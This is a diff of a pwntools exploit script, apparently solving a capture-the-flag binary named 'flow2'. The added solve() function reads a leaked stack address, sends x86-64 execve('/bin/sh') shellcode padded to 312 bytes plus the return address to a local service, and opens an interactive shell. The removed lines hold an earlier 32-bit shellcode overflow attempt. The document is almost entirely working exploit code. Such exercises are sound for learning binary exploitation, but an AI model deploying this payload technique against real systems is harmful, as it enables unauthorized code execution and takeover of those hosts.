@@ -2,18 +2,23 @@ from pwn import *
 from pwn import p64
 
 
+def solve():
+    # context.binary = ELF('./flow2')
+    # p = process()
+    p = remote("localhost", 2002)
+    p.recvuntil(b'0x')
+    addr = int(p.recvline().decode('utf-8'),16)
+    print("addr:", addr, hex(addr))
+    # my mac cannot load this shellcode
+    # payload = asm(shellcraft.sh())          # The shellcode
+    payload = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
+    payload = payload.ljust(312, b'A')      # Padding
+    payload += p64(addr)                    # Address of the Shellcode
+    with open("input.txt","wb") as f:
+        f.write(payload)
+    log.info(p.clean())
+    p.sendline(payload)
+    p.interactive()
+    p.close()
 
-offset = 88
-nop = b'\x90'
-shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
-# add a null byte
-shellcode += b"\x00"
-buff_addr = p64(0x7fffffffdda0)
-shellcode = b"\x5a\x12\40\x00"
-elf = ELF('flow2')
-p = elf.process()
-# p = remote("0.0.0.0", 2001)
-payload = shellcode + (88 - len(shellcode)) * nop + shellcode 
-p.sendline(payload)
-p.interactive()
-
+solve()
